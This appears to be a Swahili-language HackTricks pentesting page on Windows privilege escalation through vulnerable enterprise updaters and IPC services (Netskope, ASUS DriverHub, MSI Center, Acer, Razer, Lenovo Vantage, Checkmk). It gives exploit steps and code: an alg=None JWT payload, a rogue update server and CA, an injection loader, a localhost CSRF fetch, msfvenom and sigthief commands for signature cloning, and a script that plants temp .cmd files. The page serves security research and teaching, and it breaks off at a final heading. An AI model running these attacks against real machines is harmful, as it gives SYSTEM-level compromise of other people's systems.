# Kutumia vibaya Auto-Updaters za Enterprise na Privileged IPC (k.m., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unaeleza kwa ujumla aina ya minyororo ya Windows local privilege escalation inayopatikana katika enterprise endpoint agents na updaters ambazo hutoa IPC surface inayoweza kufikiwa kwa urahisi na mtiririko wa update wenye privileges. Mfano unaowakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye privileges za chini anaweza kulazimisha enrollment iunganishwe na server inayodhibitiwa na mshambulizi, kisha kuwasilisha MSI hasidi ambayo huduma ya SYSTEM huisakinisha.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Mawazo muhimu unayoweza kutumia tena dhidi ya bidhaa zinazofanana:
- Tumia vibaya localhost IPC ya huduma yenye privileges ili kulazimisha enrollment au usanidi upya kuelekezwa kwenye server ya mshambulizi.
- Tekeleza update endpoints za vendor, wasilisha Trusted Root CA hasidi, kisha uelekeze updater kwenye package hasidi “iliyotiwa saini”.
- Epuka ukaguzi dhaifu wa signer (orodha zinazoruhusu CN), flags za digest ambazo ni za hiari, na MSI properties zisizowekewa masharti madhubuti.
- Ikiwa IPC “imesimbwa kwa njia fiche”, pata key/IV kutoka kwa vitambulisho vya mashine vinavyoweza kusomwa na kila mtu vilivyohifadhiwa kwenye registry.
- Ikiwa huduma inazuia callers kulingana na image path/process name, ingiza msimbo kwenye process iliyo kwenye orodha inayoruhusiwa au anzisha moja ikiwa suspended na uanzishe DLL yako kupitia marekebisho madogo ya thread-context.

Huduma maalum za TCP za ndani zinapaswa kuchunguzwa utambulisho na mipaka ya input kwa umakini huohuo, hata zinapohitaji PIN au credential nyingine ya programu. Tambua listener, process yake na service account inayotumika, kisha kagua binary/version halisi iliyosambazwa na ikiwa fields zinazodhibitiwa na caller hukaguliwa urefu wake kabla ya kunakiliwa kwenye fixed buffers au kutumiwa kutengeneza amri ya child-process. [Mwongozo wa Microsoft kuhusu buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) unaeleza kwa nini input ya nje isiyokaguliwa ni hatari kwenye privileged native code. Listener ya loopback, credential iliyowekwa moja kwa moja kwenye msimbo, au process name pekee havithibitishi memory corruption au utekelezaji wa SYSTEM; kufikika, uidhinishaji, code path na mitigations ni masharti tofauti. Fanya enumeration ya kawaida bila kutuma inputs zenye urefu wa kusababisha crash kwa huduma inayotumika.

---
## 1) Kulazimisha enrollment iunganishwe na server ya mshambulizi kupitia localhost IPC

Agents nyingi huja na user-mode UI process inayowasiliana na huduma ya SYSTEM kupitia localhost TCP ikitumia JSON.

Ilibainika kwenye Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Mtiririko wa exploit:
1) Tengeneza JWT enrollment token ambayo claims zake hudhibiti backend host (k.m., AddonUrl). Tumia alg=None ili saini isihitajike.
2) Tuma ujumbe wa IPC unaoita provisioning command pamoja na JWT yako na jina la tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Huduma inaanza kutuma maombi kwa server yako rogue kwa ajili ya enrollment/config, k.m.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Vidokezo:
- Ikiwa uthibitishaji wa caller unategemea path/name, anzisha ombi kutoka kwa vendor binary iliyo kwenye orodha ya kuruhusiwa (angalia §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Kuteka nyara channel ya update ili kuendesha code kama SYSTEM

Mara tu client inapowasiliana na server yako, tekeleza endpoints zinazotarajiwa na uielekeze kwenye MSI ya mshambuliaji. Mfuatano wa kawaida:

1) /v2/config/org/clientconfig → Rudisha config ya JSON yenye interval fupi sana ya updater, k.m.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Rudisha cheti cha CA cha PEM. Huduma hukisakinisha kwenye hifadhi ya Trusted Root ya Local Machine.
3) /v2/checkupdate → Toa metadata inayoelekeza kwenye MSI hasidi na toleo bandia.

Kukwepa ukaguzi wa kawaida unaoonekana mara nyingi:
- Orodha ya kuruhusu ya Signer CN: huduma inaweza kuangalia tu kama Subject CN ni “netSkope Inc” au “Netskope, Inc.”. Rogue CA yako inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- Sifa ya CERT_DIGEST: jumuisha sifa ya MSI isiyo na madhara inayoitwa CERT_DIGEST. Hakuna utekelezaji wake wakati wa kusakinisha.
- Utekelezaji wa hiari wa digest: bendera ya usanidi (kwa mfano, check_msi_digest=false) huzima uthibitishaji wa ziada wa kriptografia.

Matokeo: huduma ya SYSTEM husakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
na kutekeleza msimbo wowote kama NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Somo la kukwepa kiraka: ikiwa mchuuzi atajibu kwa kuruhusu orodha ndogo ya vikoa “vinavyoaminika” badala ya kuthibitisha chanzo cha sasisho kwa kriptografia, tafuta redirector au reverse proxy zinazomilikiwa na mchuuzi ambazo bado hukuruhusu kuelekeza trafiki. Katika kesi ya Netskope, utafiti wa umma uliofuata ulionyesha kwamba orodha ya kuruhusu ya enzi ya R129 bado ingeweza kutumiwa vibaya kupitia `rproxy.goskope.com`, ambayo ilipitisha maudhui ya Azure App Service yaliyodhibitiwa na mshambuliaji. Chukulia orodha za majina ya host kama kikwazo kidogo, si kama mpaka wa uaminifu.<sup>[[14]](#references)</sup>

---
## 3) Kutengeneza maombi ya IPC yaliyosimbwa (yanapokuwepo)

Kuanzia R127, Netskope ilifunga JSON ya IPC kwenye sehemu ya encryptData inayoonekana kama Base64. Reverse engineering ilionyesha AES yenye key/IV zinazotokana na thamani za registry zinazoweza kusomwa na mtumiaji yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Washambuliaji wanaweza kurudia usimbaji fiche na kutuma amri halali zilizofichwa kutoka kwa mtumiaji wa kawaida.<sup>[[1]](#references)[[2]](#references)</sup> Kidokezo cha jumla: ikiwa agent itaanza ghafla “kusimba” IPC, tafuta device ID, product GUID, na install ID chini ya HKLM ili zitumike kama nyenzo.

---
## 4) Kukwepa orodha za kuruhusu za wapigaji wa IPC (ukaguzi wa path/name)

Baadhi ya huduma hujaribu kuthibitisha peer kwa kutafuta PID ya muunganisho wa TCP na kulinganisha image path/name na binary za mchuuzi zilizo kwenye orodha ya kuruhusu na ziko chini ya Program Files (kwa mfano, stagentui.exe, bwansvc.exe, epdlp.exe).

Njia mbili za vitendo za kukwepa:
- DLL injection kwenye process iliyo kwenye orodha ya kuruhusu (kwa mfano, nsdiag.exe) na kupitisha IPC kutoka ndani yake.
- Anzisha binary iliyo kwenye orodha ya kuruhusu ikiwa imesimamishwa na uanzishe proxy DLL yako bila CreateRemoteThread (tazama §5) ili kutimiza sheria za kuzuia uchezewaji zinazotekelezwa na driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection inayozingatia ulinzi dhidi ya uchezewaji: process iliyosimamishwa + patch ya NtContinue

Bidhaa mara nyingi hujumuisha driver ya minifilter/OB callbacks (kwa mfano, Stadrv) ili kuondoa ruhusa hatari kwenye handles za process zinazolindwa:
- Process: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: huruhusu tu THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Loader ya user-mode inayotegemeka na inayozingatia vizuizi hivi:
1) Tumia CreateProcess kuanzisha binary ya mchuuzi kwa CREATE_SUSPENDED.
2) Pata handles ambazo bado unaruhusiwa kupata: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye process, na handle ya thread yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au THREAD_RESUME pekee ikiwa unaweka patch ya code kwenye RIP inayojulikana).
3) Andika juu ya ntdll!NtContinue (au thunk nyingine ya mapema ambayo imehakikishwa kupakiwa) kwa stub ndogo inayoita LoadLibraryW kwenye njia ya DLL yako, kisha huruka kurudi.
4) Tumia ResumeThread ili kuanzisha stub yako ndani ya process na kupakia DLL yako.

Kwa kuwa hukutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME kwenye process ambayo tayari imelindwa (uliianzisha wewe mwenyewe), sera ya driver inatimizwa.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Zana za vitendo
- NachoVPN (plugin ya Netskope) huendesha kiotomatiki rogue CA, usainishaji wa MSI hasidi, na hutoa endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ni mteja maalum wa IPC anayetengeneza ujumbe wowote wa IPC (unaoweza kusimbwa kwa AES kwa hiari) na hujumuisha injection ya process iliyosimamishwa ili kutuma maombi kutoka kwenye binary iliyo kwenye orodha ya kuruhusu.<sup>[[4]](#references)</sup>

## 7) Mtiririko wa haraka wa uchunguzi wa awali kwa nyuso zisizojulikana za updater/IPC

Unapokutana na endpoint agent mpya au kundi la “helper” la motherboard, mtiririko wa haraka wa kazi kwa kawaida hutosha kubaini kama umepata shabaha inayofaa ya privesc:<sup>[[6]](#references)</sup>

1) Orodhesha wasikilizaji wa loopback na uwahusishe na process za mchuuzi:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Orodhesha named pipes zinazoweza kufaa:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Chunguza data ya uelekezaji inayotegemea registry inayotumiwa na seva za IPC zinazotumia plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Toa majina ya endpoint, funguo za JSON, na vitambulisho vya command kutoka kwa client ya user-mode kwanza. Frontend za Electron/.NET zilizopakiwa mara nyingi leak schema kamili:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Tafuta sharti halisi la uaminifu, si tu njia ya msimbo inayoishia kuzindua mchakato:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Miundo inayofaa kupewa kipaumbele:
- `CryptQueryObject`/uchanganuzi wa certificate bila `WinVerifyTrust` kwa kawaida huashiria kuwa “certificate ipo” ilichukuliwa kuwa “certificate inaaminika”, na hivyo kuwezesha certificate cloning au mbinu nyingine za fake-signer.
- Ukaguzi wa substring/suffix kwenye `Origin`, `Referer`, URL za kupakua, majina ya process au CN za signer si uthibitishaji. `contains(".vendor.com")` kwa kawaida inaweza kutumiwa vibaya kupitia domain zinazofanana zinazodhibitiwa na attacker.
- Ikiwa GUI yenye ruhusa za chini ndiyo inayoamua “file inaaminika” na SYSTEM broker inatumia tu matokeo hayo, kurekebisha au kutekeleza upya DLL/JS ya upande wa client mara nyingi hupita kabisa mpaka wa usalama (Razer-style split validation).
- Ikiwa broker inakili payload hadi `%TEMP%`/`C:\Windows\Temp` kisha inathibitisha au kuratibu utekelezaji wake kutoka hapo, jaribu mara moja uwezekano wa kubadilisha faili kati ya ukaguzi na matumizi (TOCTOU), pamoja na sibling plugin modules zinazotoa wrappers mbadala za `ExecuteTask()` zenye ukaguzi dhaifu zaidi.<sup>[[6]](#references)</sup>

Kwa targets zinazotumia named pipes kwa wingi, PipeViewer ni njia ya haraka ya kuona DACL dhaifu na pipes zinazoweza kufikiwa kwa mbali kabla hujaanza kureverse protocol kwa kina.<sup>[[11]](#references)</sup>

Ikiwa target inathibitisha callers kwa PID, image path au process name pekee, ichukulie hiyo kama kikwazo kidogo badala ya mpaka wa usalama: kuingiza code ndani ya client halali, au kuanzisha connection kutoka process iliyoruhusiwa, mara nyingi kunatosha kupita ukaguzi wa server. Kwa named pipes hasa, [ukurasa huu kuhusu client impersonation na pipe abuse](named-pipe-client-impersonation.md) unaeleza primitive hiyo kwa kina zaidi.

Kwa **cleanup au restore broker** yenye ruhusa za juu, kagua pia mpaka wa uaminifu wa path pamoja na ACL ya pipe. Caller mwenye ruhusa za chini anaweza kuchagua restore destination au kubadilisha jina la staged backup artifact kwenye shared directory hata kama service executable na install directory yake zinalindwa. Thibitisha kando kwamba caller anaweza kufikia restore command, kurekebisha staged input au filename husika, kwamba broker inaendeshwa chini ya identity yenye ruhusa za juu, na kwamba restore operation yake huandika kweli kwenye protected path iliyochaguliwa. Staging directory inayoweza kuandikwa au pipe inayoweza kusomwa pekee havithibitishi uwezo wa kuandika kiholela kwa ruhusa za juu; destination mapping na tabia ya service vinahitaji code review au controlled testing. Usitumie cleanup command isiyojulikana wakati wa passive enumeration kwa sababu inaweza kufuta mafaili ya mtumiaji.

---
## 8) Modular add-in brokers zinazothibitishwa kwa saini za vendor pekee (muundo wa Lenovo Vantage)

Tofauti mpya zaidi inayostahili kutafutwa ni **signed-client RPC broker**: process ya desktop ya Lenovo-signed yenye ruhusa za chini huwasiliana na SYSTEM service, na service huelekeza JSON commands kwenye seti ya add-ins zilizoelezwa kwa XML chini ya `%ProgramData%`. Baada ya kufanikisha code execution **ndani ya signed client yoyote inayokubaliwa**, kila contract yenye `runas="system"` huwa sehemu ya attack surface yako.<sup>[[15]](#references)</sup>

Primitives muhimu zilizoonekana kwenye utafiti wa Lenovo Vantage:
- **Kumwamini caller kwa sababu tu imesainiwa na vendor**: watafiti walifikia authenticated context kwa kunakili Lenovo-signed EXE hadi directory inayoweza kuandikwa na kutimiza DLL side-load (`profapi.dll`), ili arbitrary code iendeshwe ndani ya client ambayo service tayari inaiamini.
- **Ugunduzi wa attack surface unaoendeshwa na manifest**: add-ins hutangazwa chini ya `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; contracts kadhaa huendeshwa kama `SYSTEM`, kwa hivyo kuorodhesha manifests hizo mara nyingi hufichua privileged verbs halisi kwa haraka zaidi kuliko kureverse broker yenyewe.
- **Bugs za kila command nyuma ya channel iliyothibitishwa**: baada ya kuingia ndani ya client inayoaminika, utafiti wa umma uligundua path-traversal pamoja na race conditions kwenye update/install verbs, matumizi mabaya ya raw SQL kwenye privileged settings databases, na ukaguzi wa registry path unaotegemea substring uliowezesha writes nje ya hive iliyokusudiwa.

Recon yenye manufaa kwenye target:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Dondoo la vitendo: kila suite ya helper inapofichua broker ambayo kwanza huthibitisha **caller process** kisha kusambaza maombi kwa amri nyingi za plugin/add-in, usiishie tu kupita ukaguzi wa uaminifu wa mwanzo. Dump jedwali la manifest/contract na fanya fuzzing kwa kila verb yenye mamlaka ya juu kivyake; kwa kawaida, channel iliyothibitishwa huficha hitilafu kadhaa za hatua ya pili.

---
## 1) CSRF kutoka browser kwenda localhost dhidi ya privileged HTTP APIs (ASUS DriverHub)

DriverHub husakinisha huduma ya HTTP ya user-mode (ADU.exe) kwenye 127.0.0.1:53000 inayotarajia simu za browser zitoke kwenye https://driverhub.asus.com. Kichujio cha origin hufanya tu `string_contains(".asus.com")` kwenye kichwa cha Origin na kwenye download URLs zinazofichuliwa na `/asus/v1.0/*`. Kwa hiyo, host yoyote inayodhibitiwa na mshambulizi, kama vile `https://driverhub.asus.com.attacker.tld`, hupita ukaguzi na inaweza kutuma maombi yanayobadilisha hali kupitia JavaScript.<sup>[[6]](#references)</sup> Tazama [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa mifumo mingine ya kuzunguka vizuizi.

Mtiririko wa vitendo:
1) Sajili domain yenye `.asus.com` ndani ya jina lake na uweke ukurasa hasidi hapo.
2) Tumia `fetch` au XHR kuita endpoint yenye mamlaka (kwa mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma body ya JSON inayotarajiwa na handler – JS ya frontend iliyopakiwa inaonyesha schema hapa chini.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Hata PowerShell CLI iliyoonyeshwa hapa chini hufaulu wakati header ya Origin inapoghushiwa ili iwe na thamani inayoaminika:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Kutembelea tovuti ya mshambuliaji kupitia kivinjari kwa hiyo huwa CSRF ya ndani inayohitaji mbofyo 1 (au mbofyo 0 kupitia `onload`) ili kuendesha helper ya SYSTEM.

---
## 2) Uthibitishaji usio salama wa code-signing na kuiga certificate (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` hupakua executable zozote zilizoainishwa kwenye JSON body na kuziweka akiba ndani ya `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Uthibitishaji wa URL ya upakuaji hutumia tena mantiki ileile ya kutafuta substring, kwa hiyo `http://updates.asus.com.attacker.tld:8000/payload.exe` inakubaliwa. Baada ya upakuaji, ADU.exe hukagua tu kwamba PE ina signature na kwamba string ya Subject inalingana na ASUS kabla ya kuiendesha — hakuna `WinVerifyTrust`, wala uthibitishaji wa chain.

Ili kutumia mchakato huu kwa madhumuni ya mashambulizi:
1) Tengeneza payload (kwa mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Nakili signer wa ASUS ndani yake (kwa mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Weka `pwn.exe` kwenye domain inayofanana na `.asus.com` kisha uanzishe UpdateApp kupitia CSRF ya kivinjari iliyoelezwa hapo juu.

Kwa kuwa vichujio vya Origin na URL hutegemea substring, na ukaguzi wa signer hulinganisha strings pekee, DriverHub hupakua na kutekeleza binary ya mshambuliaji kwa muktadha wake ulioinuliwa.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU ndani ya njia za kunakili/kutekeleza za updater (MSI Center CMD_AutoUpdateSDK)

Huduma ya SYSTEM ya MSI Center hutoa protocol ya TCP ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Kipengele kikuu (Component ID `0f 27 00 00`) kina `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
1) Hunakili executable iliyotolewa hadi `C:\Windows\Temp\MSI Center SDK.exe`.
2) Huthibitisha signature kupitia `CS_CommonAPI.EX_CA::Verify` (subject ya certificate lazima iwe sawa na “MICRO-STAR INTERNATIONAL CO., LTD.” na `WinVerifyTrust` ifanikiwe).
3) Huunda scheduled task inayoendesha faili ya temp kama SYSTEM kwa arguments zinazodhibitiwa na mshambuliaji.

Faili iliyonakiliwa haifungwi kati ya uthibitishaji na `ExecuteTask()`. Mshambuliaji anaweza:
- Kutuma Frame A inayoelekeza kwenye binary halali iliyosainiwa na MSI (inahakikisha ukaguzi wa signature unafaulu na task inawekwa kwenye foleni).
- Kuishindania kwa kutuma mara kwa mara ujumbe wa Frame B unaoelekeza kwenye payload hasidi, na kubatilisha `MSI Center SDK.exe` mara tu baada ya uthibitishaji kukamilika.

Scheduler inapotekeleza task, huendesha payload iliyobatilishwa chini ya SYSTEM licha ya kuwa ilithibitisha faili ya awali. Unyonyaji wa kuaminika hutumia goroutines/threads mbili zinazotuma `CMD_AutoUpdateSDK` mara nyingi hadi ushindwe dirisha la TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Kutumia vibaya IPC maalum ya kiwango cha SYSTEM na uigaji wa utambulisho (MSI Center + Acer Control Centre)

### Seti za amri za MSI Center TCP
- Kila plugin/DLL inayopakiwa na `MSI.CentralServer.exe` hupokea Component ID inayohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Baiti 4 za kwanza za frame huchagua component hiyo, hivyo washambuliaji wanaweza kuelekeza amri kwenye modules zozote.
- Plugins zinaweza kufafanua task runners zao. `Support\API_Support.dll` hutoa `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na kuita `API_Support.EX_Task::ExecuteTask()` moja kwa moja bila uthibitishaji wa signature — mtumiaji yeyote wa ndani anaweza kuelekeza kwenye `C:\Users\<user>\Desktop\payload.exe` na kupata utekelezaji wa SYSTEM kwa uhakika.
- Kunasa traffic ya loopback kwa Wireshark au kuchunguza binaries za .NET kwa dnSpy hufichua haraka ulinganifu wa Component ↔ command; kisha clients maalum za Go/Python zinaweza kutuma tena frames.<sup>[[6]](#references)</sup>

### Named pipes za Acer Control Centre na viwango vya impersonation
- `ACCSvc.exe` (SYSTEM) hutoa `\\.\pipe\treadstone_service_LightMode`, na discretionary ACL yake huruhusu clients za mbali (kwa mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na njia ya faili huanzisha utaratibu wa huduma wa kuzindua process.
- Maktaba ya client huserialise baiti ya mwisho maalum (113) pamoja na args. Instrumentation ya moja kwa moja kwa Frida/`TsDotNetLib` (tazama [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) kwa vidokezo vya instrumentation) huonyesha kwamba handler ya native hubadilisha thamani hii kuwa `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
- Kubadilisha 113 (`0x71`) na 114 (`0x72`) hupeleka kwenye tawi la jumla linalohifadhi token kamili ya SYSTEM na kuweka high-integrity SID (`S-1-16-12288`). Kwa hiyo binary iliyozinduliwa huendeshwa kama SYSTEM isiyo na vizuizi, ndani ya mashine na kati ya mashine.
- Changanya hilo na flag ya installer iliyo wazi (`Setup.exe -nocheck`) ili kusakinisha ACC hata kwenye lab VMs na kujaribu pipe bila hardware ya vendor.<sup>[[6]](#references)</sup>

Hitilafu hizi za IPC zinaonyesha kwa nini huduma za localhost lazima zitekeleze mutual authentication (ALPC SIDs, vichujio vya `ImpersonationLevel=Impersonation`, uchujaji wa token) na kwa nini helper ya kila module ya “run arbitrary binary” lazima itumie uthibitishaji uleule wa signer.

---
## 3) Helpers za COM/IPC “elevator” zinazotegemea uthibitishaji dhaifu wa user-mode (Razer Synapse 4)

Razer Synapse 4 iliongeza muundo mwingine muhimu katika kundi hili: mtumiaji mwenye ruhusa za chini anaweza kuomba helper ya COM izindue process kupitia `RzUtility.Elevator`, huku uamuzi wa uaminifu ukikabidhiwa kwa DLL ya user-mode (`simple_service.dll`) badala ya kutekelezwa kwa uthabiti ndani ya mpaka wenye ruhusa za juu.

Njia ya unyonyaji iliyoonekana:
- Anzisha object ya COM `RzUtility.Elevator`.
- Ita `LaunchProcessNoWait(<path>, "", 1)` kuomba uzinduzi wenye ruhusa za juu.
- Katika PoC ya umma, kizuizi cha PE-signature ndani ya `simple_service.dll` hurekebishwa na kuzimwa kabla ya kutuma ombi, na hivyo kuruhusu executable yoyote iliyochaguliwa na mshambuliaji kuzinduliwa.<sup>[[6]](#references)[[10]](#references)</sup>

Ombi dogo la PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Hitimisho la jumla: unapochunguza kwa reverse engineering suite za “helper”, usiishie kwenye TCP ya localhost au named pipes. Tafuta COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha hakiki ikiwa huduma yenye haki za juu inathibitisha yenyewe binary inayolengwa au inaamini tu matokeo yaliyokokotolewa na client DLL ya user-mode inayoweza kurekebishwa. Muundo huu unatumika zaidi ya Razer: muundo wowote uliogawanywa ambamo broker yenye haki za juu hutumia uamuzi wa kuruhusu/kukataa kutoka upande wenye haki za chini unaweza kuwa sehemu inayowezesha privesc.

---
## Utekelezaji wa script ya muda inayotabirika wakati wa kurekebisha MSI (Checkmk Agent / CVE-2024-0670)

Baadhi ya Windows agents bado hutekeleza vitendo vyenye haki za juu kwa kuandika `.cmd` ya muda kwenye `C:\Windows\Temp` na kuiendesha kama `SYSTEM`. Jina la faili likitabirika na huduma isipozalisha faili zilizopo upya kwa usalama, mtumiaji mwenye haki za chini anaweza kuunda mapema faili ya muda itakayotumika baadaye na kuiweka **read-only**, kisha kufanya mchakato wenye haki za juu utekeleze maudhui yanayodhibitiwa na mshambuliaji badala ya script yake yenyewe.

Imeonekana kwenye builds za Checkmk Agent zilizo hatarini:
- muundo wa temp: `cmk_all_<PID>_1.cmd`
- matawi yaliyoathirika: `2.0.0`, `2.1.0`, `2.2.0`
- kichochezi: **repair** ya kifurushi cha agent kilichohifadhiwa cha MSI<sup>[[8]](#references)[[9]](#references)</sup>

Mtiririko wa vitendo:
1. Kadiria masafa halisi ya PID kutoka kwa process IDs za sasa au PID ya agent inayoendesha.
2. Andika payload fupi ya `.cmd` ya **ASCII** (`Set-Content -Encoding Ascii` au uelekeze matokeo ya `cmd.exe`; epuka matokeo ya PowerShell ya UTF-16 kwa batch files).
3. Weka nakala za `C:\Windows\Temp\cmk_all_<PID>_1.cmd` katika masafa lengwa, kisha weka kila faili kuwa read-only.
4. Anzisha repair ya MSI iliyohifadhiwa ili huduma yenye haki za juu ijaribu kuzalisha upya script ya muda kisha kuitekeleza.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ikiwa bidhaa iliyo hatarini iliwekwa kwa kutumia Windows Installer, tambua jina la bidhaa linalolingana na MSI yenye jina linaloonekana kuwa la kubahatisha iliyohifadhiwa kwenye `C:\Windows\Installer` kabla ya kuanzisha urekebishaji:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Maelezo ya kiutendaji:
- `qwinsta` ni muhimu wakati `msiexec /fa` inashindwa kutoka kwenye WinRM shell isiyo ya mwingiliano na unahitaji kubaini kama session iliyopo ya desktop/iliyokatika muunganisho inaweza kuanzisha repair ipasavyo.<sup>[[7]](#references)</sup>
- Muundo huu unatumika pia kwa endpoint agents na updaters nyingine ambazo **huweka scripts za muda katika maeneo yanayoweza kuandikiwa na kila mtu, kisha kuzitekeleza kama SYSTEM**. Jaribu majina yanayotabirika, kutokuwepo kwa mbinu za kuunda faili kwa upekee, na mtiririko wa repair/update unaoweza kuanzishwa unapohitaji.

### Repair ya interactive installer na console yenye priviliji

PDF24 Creator 11.15.1 inaonyesha hatari tofauti ya MSI-repair: custom action ya kusakinisha printer inaweza kuwasha console inayoonekana yenye haki za SYSTEM wakati wa repair. Vendor alibadilisha MSI installer katika 11.15.2 ili kushughulikia tabia hii. Toleo la zamani la bidhaa ni kiashiria cha awali tu cha uchunguzi. Kagua kifurushi cha MSI kilichosajiliwa au kinachoweza kufikiwa, kama mtumiaji huyu anaweza kuanzisha repair, kama custom action iliyo hatarini na ucheleweshaji wa log-file vipo, na kama desktop ya interactive inaweza kuonyesha console. Ucheleweshaji ulioripotiwa ulitumia oplock kwenye `faxPrnInst.log`; uwezo wa kawaida wa kuandika faili si sharti pekee la ufikiaji. Shell isiyo ya mwingiliano, kifurushi kisichoweza kufikiwa, au installer iliyorekebishwa inaweza kuvunja mnyororo huu. Tatizo hili halitegemei `AlwaysInstallElevated` na ni tofauti na kubadilisha script ya muda yenye jina linalotabirika.

---
## Utekaji wa remote supply chain kupitia uthibitishaji dhaifu wa updater (WinGUp / Notepad++)

